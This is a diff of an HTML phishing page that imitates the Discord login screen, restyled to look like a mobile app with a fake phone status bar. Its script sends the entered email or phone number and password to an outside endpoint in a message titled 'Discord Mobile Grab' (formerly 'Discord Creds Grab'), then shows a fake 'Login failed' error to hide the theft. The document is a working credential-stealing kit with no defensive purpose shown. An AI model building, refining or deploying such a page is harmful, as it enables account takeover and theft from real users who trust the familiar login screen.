@@ -2,49 +2,85 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>Discord - Login</title>
   <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/3/35/Discord-Logo-White.svg" type="image/svg+xml">
   <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      font-family: 'gg sans', sans-serif;
       background: #36393f;
       color: #dcddde;
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
-      align-items: center;
-      justify-content: center;
+      flex-direction: column;
     }
+    .status-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 44px;
+      background: rgba(0,0,0,0.3);
+      color: white;
+      font-size: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 16px;
+      z-index: 10;
+      backdrop-filter: blur(10px);
+    }
+    .status-bar .time { font-weight: 600; }
+    .status-bar .icons { display: flex; gap: 6px; }
     .container {
-      background: #36393f;
-      border-radius: 5px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-      width: 440px;
-      max-width: 90%;
-      padding: 40px 32px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 40px 24px 60px;
+      max-width: 500px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .logo-container {
       text-align: center;
+      margin-bottom: 32px;
+      position: relative;
     }
     .logo {
-      width: 120px;
+      width: 80px;
       height: auto;
-      margin: 0 auto 24px;
-      filter: brightness(1.1);
+    }
+    .help-btn {
+      position: absolute;
+      top: 0;
+      right: 0;
+      background: #5865f2;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      font-size: 14px;
+      cursor: pointer;
     }
     h1 {
-      font-size: 24px;
+      font-size: 28px;
       font-weight: 600;
       color: #fff;
+      text-align: center;
       margin-bottom: 8px;
     }
     .subtitle {
       font-size: 16px;
       color: #b9bbbe;
-      margin-bottom: 32px;
+      text-align: center;
+      margin-bottom: 40px;
     }
     .form-group {
-      margin-bottom: 20px;
+      margin-bottom: 24px;
       text-align: left;
     }
     label {
@@ -57,49 +93,46 @@
     }
     input {
       width: 100%;
-      padding: 10px 12px;
+      padding: 14px 16px;
       background: #202225;
-      border: 1px solid #202225;
-      border-radius: 3px;
-      color: #dcddde;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
       font-size: 16px;
-      transition: border-color 0.2s;
     }
     input:focus {
       outline: none;
-      border-color: #00aff4;
-      box-shadow: 0 0 0 2px rgba(0, 175, 244, 0.4);
+      box-shadow: 0 0 0 2px #00aff4;
     }
     .forgot {
       font-size: 14px;
       color: #00aff4;
       text-decoration: none;
       display: block;
-      margin: 8px 0 24px;
-      text-align: left;
+      margin: 8px 0 32px;
     }
     .forgot:hover {
       text-decoration: underline;
     }
     .btn {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       background: #5865f2;
       border: none;
-      border-radius: 3px;
+      border-radius: 4px;
       color: white;
       font-size: 16px;
-      font-weight: 500;
+      font-weight: 600;
       cursor: pointer;
-      transition: background 0.15s;
     }
     .btn:hover {
       background: #4752c4;
     }
     .footer {
-      margin-top: 32px;
+      text-align: center;
       font-size: 14px;
       color: #72767d;
+      margin-top: 40px;
     }
     .footer a {
       color: #00aff4;
@@ -111,27 +144,39 @@
     .error {
       color: #ed4245;
       font-size: 14px;
-      margin: 12px 0;
+      text-align: center;
+      margin: 16px 0;
       display: none;
+    }
+    @media (min-width: 768px) {
+      .container { padding: 60px 40px; max-width: 440px; }
     }
   </style>
 </head>
 <body>
+  <div class="status-bar">
+    <div class="time">02:30</div>
+    <div class="icons">📶 WiFi 🔋</div>
+  </div>
+
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Discord-Logo-White.svg" alt="Discord" class="logo">
+    <div class="logo-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Discord-Logo-White.svg" alt="Discord" class="logo">
+      <button class="help-btn">?</button>
+    </div>
 
     <h1>Welcome back!</h1>
     <p class="subtitle">We're so excited to see you again!</p>
 
     <form id="loginForm">
       <div class="form-group">
-        <label for="email">EMAIL OR PHONE NUMBER *</label>
-        <input type="text" id="email" name="email" required autocomplete="off"/>
+        <label>EMAIL OR PHONE NUMBER *</label>
+        <input type="text" id="email" required autocomplete="off"/>
       </div>
 
       <div class="form-group">
-        <label for="password">PASSWORD *</label>
-        <input type="password" id="password" name="password" required autocomplete="off"/>
+        <label>PASSWORD *</label>
+        <input type="password" id="password" required autocomplete="off"/>
       </div>
 
       <a href="#" class="forgot">Forgot your password?</a>
@@ -170,7 +215,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             embeds: [{
-              title: "🎯 Discord Creds Grab",
+              title: "🎯 Discord Mobile Grab",
               color: 0x5865F2,
               fields: [
                 { name: "Email/Phone", value: `\`\`\`${email}\`\`\``, inline: false },
@@ -181,7 +226,7 @@
             }]
           })
         });
-      } catch {} 
+      } catch {}
 
       error.textContent = "Login failed. Please check your credentials and try again.";
       error.style.display = "block";
